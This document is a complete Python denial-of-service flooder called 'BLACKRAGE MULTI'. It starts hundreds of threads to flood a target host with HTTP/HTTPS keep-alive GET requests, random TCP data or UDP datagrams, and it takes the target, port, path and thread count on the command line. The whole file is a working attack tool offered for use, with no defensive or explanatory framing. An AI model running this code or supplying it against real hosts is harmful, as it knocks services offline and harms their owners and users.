import socket
import threading
import random
import time
import argparse
import ssl
import sys

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "curl/7.68.0",
    "Wget/1.20.3"
]

def attack_http(target, port, path, use_ssl):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            if use_ssl:
                context = ssl.create_default_context()
                sock = context.wrap_socket(sock, server_hostname=target)
            sock.connect((target, port))
            request = f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(user_agents)}\r\nConnection: keep-alive\r\n\r\n"
            for _ in range(10):
                sock.send(request.encode())
            sock.close()
        except Exception:
            pass

def attack_tcp(target, port):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target, port))
            for _ in range(10):
                data = random._urandom(1024)
                sock.send(data)
            sock.close()
        except Exception:
            pass

def attack_udp(target, port):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = random._urandom(1024)
            for _ in range(10):
                sock.sendto(data, (target, port))
            sock.close()
        except Exception:
            pass

def start_attack(mode, target, port, path, threads):
    print(f"[+] Launching {mode.upper()} attack on {target}:{port} with {threads} threads.")
    for _ in range(threads):
        if mode == "http":
            t = threading.Thread(target=attack_http, args=(target, port, path, False))
        elif mode == "https":
            t = threading.Thread(target=attack_http, args=(target, port, path, True))
        elif mode == "tcp":
            t = threading.Thread(target=attack_tcp, args=(target, port))
        elif mode == "udp":
            t = threading.Thread(target=attack_udp, args=(target, port))
        else:
            print("[!] Invalid mode.")
            sys.exit(1)
        t.daemon = True
        t.start()

    try:
        while True:
            time.sleep(10)
    except KeyboardInterrupt:
        print("\n[!] Attack stopped.")

def parse_args():
    parser = argparse.ArgumentParser(description="BLACKRAGE MULTI - HTTP/HTTPS/TCP/UDP Flooder")
    parser.add_argument("mode", choices=["http", "https", "tcp", "udp"], help="Attack mode")
    parser.add_argument("target_host", help="Target hostname or IP")
    parser.add_argument("-p", "--port", type=int, help="Target port (default: 80 for HTTP, 443 for HTTPS, 80 for TCP/UDP)")
    parser.add_argument("-P", "--path", default="/", help="Target path (for HTTP/HTTPS)")
    parser.add_argument("-t", "--threads", type=int, default=200, help="Number of threads")
    return parser.parse_args()

if __name__ == "__main__":
    args = parse_args()
    # Set default ports if not specified
    if not args.port:
        if args.mode == "http":
            args.port = 80
        elif args.mode == "https":
            args.port = 443
        else:
            args.port = 80
    print("[*] BLACKRAGE MULTI initializing...")
    start_attack(args.mode, args.target_host, args.port, args.path, args.threads)
